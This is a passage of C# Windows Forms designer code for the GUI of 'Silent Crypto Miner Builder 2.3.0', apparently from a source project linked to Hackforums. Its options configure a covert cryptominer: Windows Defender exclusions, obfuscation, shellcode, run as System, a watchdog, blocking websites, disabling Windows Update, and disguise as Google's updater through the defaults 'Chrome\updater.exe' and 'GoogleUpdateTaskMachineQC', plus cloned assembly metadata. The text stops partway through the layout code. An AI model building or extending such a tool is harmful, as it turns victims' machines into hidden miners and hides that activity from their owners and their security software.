using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace SilentCryptoMiner
{
    [DesignerGenerated()]
    public partial class Builder : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Builder));
            this.workerBuild = new System.ComponentModel.BackgroundWorker();
            this.formBuilder = new MephTheme();
            this.tabcontrolBuilder = new MephTabcontrol();
            this.tabMain = new System.Windows.Forms.TabPage();
            this.labelLang = new System.Windows.Forms.Label();
            this.comboLanguage = new MephComboBox();
            this.btnLoadState = new MephButton();
            this.btnSaveState = new MephButton();
            this.listMiners = new MephListBox();
            this.btnMinerRemove = new MephButton();
            this.btnMinerEdit = new MephButton();
            this.btnMinerAdd = new MephButton();
            this.labelMiners = new System.Windows.Forms.Label();
            this.labelWiki = new System.Windows.Forms.LinkLabel();
            this.labelHelp = new System.Windows.Forms.Label();
            this.tabStartup = new System.Windows.Forms.TabPage();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.labelStartupRunSystem = new System.Windows.Forms.Label();
            this.toggleRunSystem = new MephToggleSwitch();
            this.txtInstallFileName = new MephTextBox();
            this.labelStartupFileName = new System.Windows.Forms.Label();
            this.labelStartupAutoDelete = new System.Windows.Forms.Label();
            this.toggleAutoDelete = new MephToggleSwitch();
            this.labelStartupWatchdog = new System.Windows.Forms.Label();
            this.toggleWatchdog = new MephToggleSwitch();
            this.chkInstall = new MephCheckBox();
            this.txtInstallEntryName = new MephTextBox();
            this.labelStartupSavePath = new System.Windows.Forms.Label();
            this.labelStartupEntryName = new System.Windows.Forms.Label();
            this.txtInstallPath = new MephComboBox();
            this.tabAssembly = new System.Windows.Forms.TabPage();
            this.labelAssemblyVersion = new System.Windows.Forms.Label();
            this.chkAssembly = new MephCheckBox();
            this.btnAssemblyRandom = new MephButton();
            this.txtAssemblyTitle = new MephTextBox();
            this.btnAssemblyClone = new MephButton();
            this.txtAssemblyProduct = new MephTextBox();
            this.txtAssemblyVersion4 = new MephTextBox();
            this.txtAssemblyDescription = new MephTextBox();
            this.txtAssemblyVersion3 = new MephTextBox();
            this.txtAssemblyCopyright = new MephTextBox();
            this.txtAssemblyVersion2 = new MephTextBox();
            this.txtAssemblyCompany = new MephTextBox();
            this.txtAssemblyVersion1 = new MephTextBox();
            this.txtAssemblyTrademark = new MephTextBox();
            this.tabIcon = new System.Windows.Forms.TabPage();
            this.chkIcon = new MephCheckBox();
            this.picIcon = new System.Windows.Forms.PictureBox();
            this.btnBrowseIcon = new MephButton();
            this.txtIconPath = new MephTextBox();
            this.tabOptions = new System.Windows.Forms.TabPage();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.txtExeSize = new MephTextBox();
            this.cFormAO = new MephListBox();
            this.btnAdvancedOptions = new MephButton();
            this.pictureBox3 = new System.Windows.Forms.PictureBox();
            this.labelOptionWindowsUpdate = new System.Windows.Forms.Label();
            this.toggleWindowsUpdate = new MephToggleSwitch();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.chkBlockWebsites = new MephCheckBox();
            this.txtBlockWebsites = new MephTextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.toggleDisableSleep = new MephToggleSwitch();
            this.labelOptionShellcode = new System.Windows.Forms.Label();
            this.toggleShellcode = new MephToggleSwitch();
            this.labelOptionAdministrator = new System.Windows.Forms.Label();
            this.toggleAdministrator = new MephToggleSwitch();
            this.picAdmin1 = new System.Windows.Forms.PictureBox();
            this.labelOptionObfuscation = new System.Windows.Forms.Label();
            this.toggleObfuscation = new MephToggleSwitch();
            this.labelOptionWD = new System.Windows.Forms.Label();
            this.toggleWDExclusions = new MephToggleSwitch();
            this.tabBuild = new System.Windows.Forms.TabPage();
            this.labelSeconds = new System.Windows.Forms.Label();
            this.labelStartDelay = new System.Windows.Forms.Label();
            this.txtStartDelay = new MephTextBox();
            this.labelHackforums = new System.Windows.Forms.LinkLabel();
            this.labelGitHub = new System.Windows.Forms.LinkLabel();
            this.txtLog = new MephTextBox();
            this.btnBuild = new MephButton();
            this.formBuilder.SuspendLayout();
            this.tabcontrolBuilder.SuspendLayout();
            this.tabMain.SuspendLayout();
            this.tabStartup.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.tabAssembly.SuspendLayout();
            this.tabIcon.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.picIcon)).BeginInit();
            this.tabOptions.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin1)).BeginInit();
            this.tabBuild.SuspendLayout();
            this.SuspendLayout();
            // 
            // workerBuild
            // 
            this.workerBuild.DoWork += new System.ComponentModel.DoWorkEventHandler(this.workerBuild_DoWork);
            // 
            // formBuilder
            // 
            this.formBuilder.AccentColor = System.Drawing.Color.Transparent;
            this.formBuilder.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formBuilder.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formBuilder.Controls.Add(this.tabcontrolBuilder);
            this.formBuilder.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.formBuilder.ForeColor = System.Drawing.Color.Gray;
            this.formBuilder.Location = new System.Drawing.Point(0, 0);
            this.formBuilder.Margin = new System.Windows.Forms.Padding(2);
            this.formBuilder.MaximumSize = new System.Drawing.Size(535, 272);
            this.formBuilder.MinimumSize = new System.Drawing.Size(535, 272);
            this.formBuilder.Name = "formBuilder";
            this.formBuilder.Size = new System.Drawing.Size(535, 272);
            this.formBuilder.SubHeader = "By Unam Sanctam";
            this.formBuilder.TabIndex = 0;
            this.formBuilder.Text = "Silent Crypto Miner Builder 2.3.0";
            // 
            // tabcontrolBuilder
            // 
            this.tabcontrolBuilder.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.tabcontrolBuilder.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.tabcontrolBuilder.Controls.Add(this.tabMain);
            this.tabcontrolBuilder.Controls.Add(this.tabStartup);
            this.tabcontrolBuilder.Controls.Add(this.tabAssembly);
            this.tabcontrolBuilder.Controls.Add(this.tabIcon);
            this.tabcontrolBuilder.Controls.Add(this.tabOptions);
            this.tabcontrolBuilder.Controls.Add(this.tabBuild);
            this.tabcontrolBuilder.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.tabcontrolBuilder.ItemSize = new System.Drawing.Size(32, 85);
            this.tabcontrolBuilder.Location = new System.Drawing.Point(13, 65);
            this.tabcontrolBuilder.Multiline = true;
            this.tabcontrolBuilder.Name = "tabcontrolBuilder";
            this.tabcontrolBuilder.SelectedIndex = 0;
            this.tabcontrolBuilder.Size = new System.Drawing.Size(511, 197);
            this.tabcontrolBuilder.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabcontrolBuilder.TabIndex = 17;
            // 
            // tabMain
            // 
            this.tabMain.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabMain.Controls.Add(this.labelLang);
            this.tabMain.Controls.Add(this.comboLanguage);
            this.tabMain.Controls.Add(this.btnLoadState);
            this.tabMain.Controls.Add(this.btnSaveState);
            this.tabMain.Controls.Add(this.listMiners);
            this.tabMain.Controls.Add(this.btnMinerRemove);
            this.tabMain.Controls.Add(this.btnMinerEdit);
            this.tabMain.Controls.Add(this.btnMinerAdd);
            this.tabMain.Controls.Add(this.labelMiners);
            this.tabMain.Controls.Add(this.labelWiki);
            this.tabMain.Controls.Add(this.labelHelp);
            this.tabMain.Location = new System.Drawing.Point(89, 4);
            this.tabMain.Name = "tabMain";
            this.tabMain.Size = new System.Drawing.Size(418, 189);
            this.tabMain.TabIndex = 0;
            this.tabMain.Text = "Main";
            // 
            // labelLang
            // 
            this.labelLang.AutoSize = true;
            this.labelLang.Location = new System.Drawing.Point(15, 160);
            this.labelLang.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelLang.Name = "labelLang";
            this.labelLang.Size = new System.Drawing.Size(68, 17);
            this.labelLang.TabIndex = 51;
            this.labelLang.Text = "Language:";
            // 
            // comboLanguage
            // 
            this.comboLanguage.BackColor = System.Drawing.Color.Transparent;
            this.comboLanguage.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboLanguage.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboLanguage.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboLanguage.ForeColor = System.Drawing.Color.Silver;
            this.comboLanguage.FormattingEnabled = true;
            this.comboLanguage.ItemHeight = 16;
            this.comboLanguage.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboLanguage.Items.AddRange(new object[] {
            "English"});
            this.comboLanguage.Location = new System.Drawing.Point(83, 158);
            this.comboLanguage.Margin = new System.Windows.Forms.Padding(2);
            this.comboLanguage.Name = "comboLanguage";
            this.comboLanguage.Size = new System.Drawing.Size(97, 22);
            this.comboLanguage.StartIndex = 0;
            this.comboLanguage.TabIndex = 50;
            // 
            // btnLoadState
            // 
            this.btnLoadState.BackColor = System.Drawing.Color.Transparent;
            this.btnLoadState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnLoadState.Location = new System.Drawing.Point(354, 158);
            this.btnLoadState.Name = "btnLoadState";
            this.btnLoadState.Size = new System.Drawing.Size(53, 22);
            this.btnLoadState.TabIndex = 49;
            this.btnLoadState.Text = "Load";
            this.btnLoadState.Click += new System.EventHandler(this.btnLoadState_Click);
            // 
            // btnSaveState
            // 
            this.btnSaveState.BackColor = System.Drawing.Color.Transparent;
            this.btnSaveState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnSaveState.Location = new System.Drawing.Point(295, 158);
            this.btnSaveState.Name = "btnSaveState";
            this.btnSaveState.Size = new System.Drawing.Size(53, 22);
            this.btnSaveState.TabIndex = 48;
            this.btnSaveState.Text = "Save";
            this.btnSaveState.Click += new System.EventHandler(this.btnSaveState_Click);
            // 
            // listMiners
            // 
            this.listMiners.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.listMiners.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listMiners.ForeColor = System.Drawing.Color.Silver;
            this.listMiners.ItemHeight = 17;
            this.listMiners.Location = new System.Drawing.Point(15, 31);
            this.listMiners.Name = "listMiners";
            this.listMiners.Size = new System.Drawing.Size(392, 64);
            this.listMiners.TabIndex = 47;
            // 
            // btnMinerRemove
            // 
            this.btnMinerRemove.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerRemove.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerRemove.Location = new System.Drawing.Point(173, 109);
            this.btnMinerRemove.Name = "btnMinerRemove";
            this.btnMinerRemove.Size = new System.Drawing.Size(73, 23);
            this.btnMinerRemove.TabIndex = 46;
            this.btnMinerRemove.Text = "Remove";
            this.btnMinerRemove.Click += new System.EventHandler(this.btnMinerRemove_Click);
            // 
            // btnMinerEdit
            // 
            this.btnMinerEdit.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerEdit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerEdit.Location = new System.Drawing.Point(94, 109);
            this.btnMinerEdit.Name = "btnMinerEdit";
            this.btnMinerEdit.Size = new System.Drawing.Size(73, 23);
            this.btnMinerEdit.TabIndex = 45;
            this.btnMinerEdit.Text = "Edit";
            this.btnMinerEdit.Click += new System.EventHandler(this.btnMinerEdit_Click);
            // 
            // btnMinerAdd
            // 
            this.btnMinerAdd.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerAdd.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerAdd.Location = new System.Drawing.Point(15, 109);
            this.btnMinerAdd.Name = "btnMinerAdd";
            this.btnMinerAdd.Size = new System.Drawing.Size(73, 23);
            this.btnMinerAdd.TabIndex = 44;
            this.btnMinerAdd.Text = "Add";
            this.btnMinerAdd.Click += new System.EventHandler(this.btnMinerAdd_Click);
            // 
            // labelMiners
            // 
            this.labelMiners.AutoSize = true;
            this.labelMiners.Location = new System.Drawing.Point(12, 11);
            this.labelMiners.Name = "labelMiners";
            this.labelMiners.Size = new System.Drawing.Size(51, 17);
            this.labelMiners.TabIndex = 42;
            this.labelMiners.Text = "Miners:";
            // 
            // labelWiki
            // 
            this.labelWiki.AutoSize = true;
            this.labelWiki.BackColor = System.Drawing.Color.Transparent;
            this.labelWiki.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.labelWiki.Location = new System.Drawing.Point(378, 11);
            this.labelWiki.Name = "labelWiki";
            this.labelWiki.Size = new System.Drawing.Size(29, 17);
            this.labelWiki.TabIndex = 40;
            this.labelWiki.TabStop = true;
            this.labelWiki.Text = "wiki";
            this.labelWiki.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelWiki_LinkClicked);
            // 
            // labelHelp
            // 
            this.labelHelp.AutoSize = true;
            this.labelHelp.BackColor = System.Drawing.Color.Transparent;
            this.labelHelp.Location = new System.Drawing.Point(226, 11);
            this.labelHelp.Name = "labelHelp";
            this.labelHelp.Size = new System.Drawing.Size(160, 17);
            this.labelHelp.TabIndex = 41;
            this.labelHelp.Text = "For help please check the ";
            // 
            // tabStartup
            // 
            this.tabStartup.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabStartup.Controls.Add(this.pictureBox2);
            this.tabStartup.Controls.Add(this.labelStartupRunSystem);
            this.tabStartup.Controls.Add(this.toggleRunSystem);
            this.tabStartup.Controls.Add(this.txtInstallFileName);
            this.tabStartup.Controls.Add(this.labelStartupFileName);
            this.tabStartup.Controls.Add(this.labelStartupAutoDelete);
            this.tabStartup.Controls.Add(this.toggleAutoDelete);
            this.tabStartup.Controls.Add(this.labelStartupWatchdog);
            this.tabStartup.Controls.Add(this.toggleWatchdog);
            this.tabStartup.Controls.Add(this.chkInstall);
            this.tabStartup.Controls.Add(this.txtInstallEntryName);
            this.tabStartup.Controls.Add(this.labelStartupSavePath);
            this.tabStartup.Controls.Add(this.labelStartupEntryName);
            this.tabStartup.Controls.Add(this.txtInstallPath);
            this.tabStartup.Location = new System.Drawing.Point(89, 4);
            this.tabStartup.Name = "tabStartup";
            this.tabStartup.Size = new System.Drawing.Size(418, 189);
            this.tabStartup.TabIndex = 1;
            this.tabStartup.Text = "Startup";
            // 
            // pictureBox2
            // 
            this.pictureBox2.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox2.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.pictureBox2.Location = new System.Drawing.Point(388, 161);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(20, 20);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox2.TabIndex = 100;
            this.pictureBox2.TabStop = false;
            // 
            // labelStartupRunSystem
            // 
            this.labelStartupRunSystem.AutoSize = true;
            this.labelStartupRunSystem.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupRunSystem.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartupRunSystem.ForeColor = System.Drawing.Color.Gray;
            this.labelStartupRunSystem.Location = new System.Drawing.Point(234, 162);
            this.labelStartupRunSystem.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupRunSystem.Name = "labelStartupRunSystem";
            this.labelStartupRunSystem.Size = new System.Drawing.Size(95, 17);
            this.labelStartupRunSystem.TabIndex = 99;
            this.labelStartupRunSystem.Text = "Run as System:";
            // 
            // toggleRunSystem
            // 
            this.toggleRunSystem.BackColor = System.Drawing.Color.Transparent;
            this.toggleRunSystem.Checked = true;
            this.toggleRunSystem.ForeColor = System.Drawing.Color.Black;
            this.toggleRunSystem.Location = new System.Drawing.Point(333, 159);
            this.toggleRunSystem.Margin = new System.Windows.Forms.Padding(2);
            this.toggleRunSystem.Name = "toggleRunSystem";
            this.toggleRunSystem.Size = new System.Drawing.Size(50, 24);
            this.toggleRunSystem.TabIndex = 98;
            // 
            // txtInstallFileName
            // 
            this.txtInstallFileName.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtInstallFileName.Enabled = false;
            this.txtInstallFileName.ForeColor = System.Drawing.Color.Silver;
            this.txtInstallFileName.Location = new System.Drawing.Point(95, 102);
            this.txtInstallFileName.Margin = new System.Windows.Forms.Padding(2);
            this.txtInstallFileName.MaxLength = 32767;
            this.txtInstallFileName.MultiLine = false;
            this.txtInstallFileName.Name = "txtInstallFileName";
            this.txtInstallFileName.Size = new System.Drawing.Size(139, 24);
            this.txtInstallFileName.TabIndex = 48;
            this.txtInstallFileName.Text = "Chrome\\updater.exe";
            this.txtInstallFileName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtInstallFileName.UseSystemPasswordChar = false;
            this.txtInstallFileName.WordWrap = false;
            // 
            // labelStartupFileName
            // 
            this.labelStartupFileName.AutoSize = true;
            this.labelStartupFileName.Location = new System.Drawing.Point(11, 104);
            this.labelStartupFileName.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupFileName.Name = "labelStartupFileName";
            this.labelStartupFileName.Size = new System.Drawing.Size(69, 17);
            this.labelStartupFileName.TabIndex = 49;
            this.labelStartupFileName.Text = "File Name:";
            // 
            // labelStartupAutoDelete
            // 
            this.labelStartupAutoDelete.AutoSize = true;
            this.labelStartupAutoDelete.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartupAutoDelete.Location = new System.Drawing.Point(12, 161);
            this.labelStartupAutoDelete.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupAutoDelete.Name = "labelStartupAutoDelete";
            this.labelStartupAutoDelete.Size = new System.Drawing.Size(79, 17);
            this.labelStartupAutoDelete.TabIndex = 47;
            this.labelStartupAutoDelete.Text = "Auto-delete:";
            // 
            // toggleAutoDelete
            // 
            this.toggleAutoDelete.BackColor = System.Drawing.Color.Transparent;
            this.toggleAutoDelete.Checked = false;
            this.toggleAutoDelete.Enabled = false;
            this.toggleAutoDelete.ForeColor = System.Drawing.Color.Black;
            this.toggleAutoDelete.Location = new System.Drawing.Point(95, 159);
            this.toggleAutoDelete.Margin = new System.Windows.Forms.Padding(2);
            this.toggleAutoDelete.Name = "toggleAutoDelete";
            this.toggleAutoDelete.Size = new System.Drawing.Size(50, 24);
            this.toggleAutoDelete.TabIndex = 46;
            // 
            // labelStartupWatchdog
            // 
            this.labelStartupWatchdog.AutoSize = true;
            this.labelStartupWatchdog.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartupWatchdog.Location = new System.Drawing.Point(12, 132);
            this.labelStartupWatchdog.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupWatchdog.Name = "labelStartupWatchdog";
            this.labelStartupWatchdog.Size = new System.Drawing.Size(70, 17);
            this.labelStartupWatchdog.TabIndex = 45;
            this.labelStartupWatchdog.Text = "Watchdog:";
            // 
            // toggleWatchdog
            // 
            this.toggleWatchdog.BackColor = System.Drawing.Color.Transparent;
            this.toggleWatchdog.Checked = true;
            this.toggleWatchdog.Enabled = false;
            this.toggleWatchdog.ForeColor = System.Drawing.Color.Black;
            this.toggleWatchdog.Location = new System.Drawing.Point(95, 130);
            this.toggleWatchdog.Margin = new System.Windows.Forms.Padding(2);
            this.toggleWatchdog.Name = "toggleWatchdog";
            this.toggleWatchdog.Size = new System.Drawing.Size(50, 24);
            this.toggleWatchdog.TabIndex = 44;
            // 
            // chkInstall
            // 
            this.chkInstall.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkInstall.BackColor = System.Drawing.Color.Transparent;
            this.chkInstall.Checked = false;
            this.chkInstall.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkInstall.ForeColor = System.Drawing.Color.Black;
            this.chkInstall.Location = new System.Drawing.Point(14, 12);
            this.chkInstall.Margin = new System.Windows.Forms.Padding(2);
            this.chkInstall.Name = "chkInstall";
            this.chkInstall.Size = new System.Drawing.Size(111, 24);
            this.chkInstall.TabIndex = 21;
            this.chkInstall.Text = "Disabled";
            this.chkInstall.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkInstall_CheckedChanged);
            // 
            // txtInstallEntryName
            // 
            this.txtInstallEntryName.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtInstallEntryName.Enabled = false;
            this.txtInstallEntryName.ForeColor = System.Drawing.Color.Silver;
            this.txtInstallEntryName.Location = new System.Drawing.Point(95, 73);
            this.txtInstallEntryName.Margin = new System.Windows.Forms.Padding(2);
            this.txtInstallEntryName.MaxLength = 32767;
            this.txtInstallEntryName.MultiLine = false;
            this.txtInstallEntryName.Name = "txtInstallEntryName";
            this.txtInstallEntryName.Size = new System.Drawing.Size(139, 24);
            this.txtInstallEntryName.TabIndex = 8;
            this.txtInstallEntryName.Text = "GoogleUpdateTaskMachineQC";
            this.txtInstallEntryName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtInstallEntryName.UseSystemPasswordChar = false;
            this.txtInstallEntryName.WordWrap = false;
            // 
            // labelStartupSavePath
            // 
            this.labelStartupSavePath.AutoSize = true;
            this.labelStartupSavePath.Location = new System.Drawing.Point(11, 46);
            this.labelStartupSavePath.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupSavePath.Name = "labelStartupSavePath";
            this.labelStartupSavePath.Size = new System.Drawing.Size(67, 17);
            this.labelStartupSavePath.TabIndex = 19;
            this.labelStartupSavePath.Text = "Save Path:";
            // 
            // labelStartupEntryName
            // 
            this.labelStartupEntryName.AutoSize = true;
            this.labelStartupEntryName.Location = new System.Drawing.Point(11, 75);
            this.labelStartupEntryName.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupEntryName.Name = "labelStartupEntryName";
            this.labelStartupEntryName.Size = new System.Drawing.Size(79, 17);
            this.labelStartupEntryName.TabIndex = 9;
            this.labelStartupEntryName.Text = "Entry Name:";
            // 
            // txtInstallPath
            // 
            this.txtInstallPath.BackColor = System.Drawing.Color.Transparent;
            this.txtInstallPath.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.txtInstallPath.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.txtInstallPath.Enabled = false;
            this.txtInstallPath.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.txtInstallPath.ForeColor = System.Drawing.Color.Silver;
            this.txtInstallPath.FormattingEnabled = true;
            this.txtInstallPath.ItemHeight = 16;
            this.txtInstallPath.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.txtInstallPath.Items.AddRange(new object[] {
            "AppData",
            "UserProfile",
            "Temp"});
            this.txtInstallPath.Location = new System.Drawing.Point(95, 45);
            this.txtInstallPath.Margin = new System.Windows.Forms.Padding(2);
            this.txtInstallPath.Name = "txtInstallPath";
            this.txtInstallPath.Size = new System.Drawing.Size(139, 22);
            this.txtInstallPath.StartIndex = 0;
            this.txtInstallPath.TabIndex = 18;
            // 
            // tabAssembly
            // 
            this.tabAssembly.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabAssembly.Controls.Add(this.labelAssemblyVersion);
            this.tabAssembly.Controls.Add(this.chkAssembly);
            this.tabAssembly.Controls.Add(this.btnAssemblyRandom);
            this.tabAssembly.Controls.Add(this.txtAssemblyTitle);
            this.tabAssembly.Controls.Add(this.btnAssemblyClone);
            this.tabAssembly.Controls.Add(this.txtAssemblyProduct);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion4);
            this.tabAssembly.Controls.Add(this.txtAssemblyDescription);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion3);
            this.tabAssembly.Controls.Add(this.txtAssemblyCopyright);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion2);
            this.tabAssembly.Controls.Add(this.txtAssemblyCompany);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion1);
            this.tabAssembly.Controls.Add(this.txtAssemblyTrademark);
            this.tabAssembly.Location = new System.Drawing.Point(89, 4);
            this.tabAssembly.Name = "tabAssembly";
            this.tabAssembly.Size = new System.Drawing.Size(418, 189);
            this.tabAssembly.TabIndex = 2;
            this.tabAssembly.Text = "Assembly";
            // 
            // labelAssemblyVersion
            // 
            this.labelAssemblyVersion.AutoSize = true;
            this.labelAssemblyVersion.Location = new System.Drawing.Point(11, 160);
            this.labelAssemblyVersion.Name = "labelAssemblyVersion";
            this.labelAssemblyVersion.Size = new System.Drawing.Size(54, 17);
            this.labelAssemblyVersion.TabIndex = 22;
            this.labelAssemblyVersion.Text = "Version:";
            // 
            // chkAssembly
            // 
            this.chkAssembly.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAssembly.BackColor = System.Drawing.Color.Transparent;
            this.chkAssembly.Checked = false;
            this.chkAssembly.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAssembly.ForeColor = System.Drawing.Color.Black;
            this.chkAssembly.Location = new System.Drawing.Point(14, 12);
            this.chkAssembly.Margin = new System.Windows.Forms.Padding(2);
            this.chkAssembly.Name = "chkAssembly";
            this.chkAssembly.Size = new System.Drawing.Size(111, 24);
            this.chkAssembly.TabIndex = 21;
            this.chkAssembly.Text = "Disabled";
            this.chkAssembly.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAssembly_CheckedChanged);
            // 
            // btnAssemblyRandom
            // 
            this.btnAssemblyRandom.BackColor = System.Drawing.Color.Transparent;
            this.btnAssemblyRandom.Enabled = false;
            this.btnAssemblyRandom.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAssemblyRandom.Location = new System.Drawing.Point(324, 156);
            this.btnAssemblyRandom.Margin = new System.Windows.Forms.Padding(2);
            this.btnAssemblyRandom.Name = "btnAssemblyRandom";
            this.btnAssemblyRandom.Size = new System.Drawing.Size(81, 25);
            this.btnAssemblyRandom.TabIndex = 5;
            this.btnAssemblyRandom.Text = "Randomize";
            this.btnAssemblyRandom.Click += new System.EventHandler(this.btnAssemblyRandom_Click);
            // 
            // txtAssemblyTitle
            // 
            this.txtAssemblyTitle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyTitle.Enabled = false;
            this.txtAssemblyTitle.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyTitle.Location = new System.Drawing.Point(14, 47);
            this.txtAssemblyTitle.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyTitle.MaxLength = 32767;
            this.txtAssemblyTitle.MultiLine = false;
            this.txtAssemblyTitle.Name = "txtAssemblyTitle";
            this.txtAssemblyTitle.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyTitle.TabIndex = 0;
            this.txtAssemblyTitle.Text = "Title...";
            this.txtAssemblyTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyTitle.UseSystemPasswordChar = false;
            this.txtAssemblyTitle.WordWrap = false;
            // 
            // btnAssemblyClone
            // 
            this.btnAssemblyClone.BackColor = System.Drawing.Color.Transparent;
            this.btnAssemblyClone.Enabled = false;
            this.btnAssemblyClone.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAssemblyClone.Location = new System.Drawing.Point(230, 156);
            this.btnAssemblyClone.Margin = new System.Windows.Forms.Padding(2);
            this.btnAssemblyClone.Name = "btnAssemblyClone";
            this.btnAssemblyClone.Size = new System.Drawing.Size(80, 25);
            this.btnAssemblyClone.TabIndex = 6;
            this.btnAssemblyClone.Text = "Clone File";
            this.btnAssemblyClone.Click += new System.EventHandler(this.btnAssemblyClone_Click);
            // 
            // txtAssemblyProduct
            // 
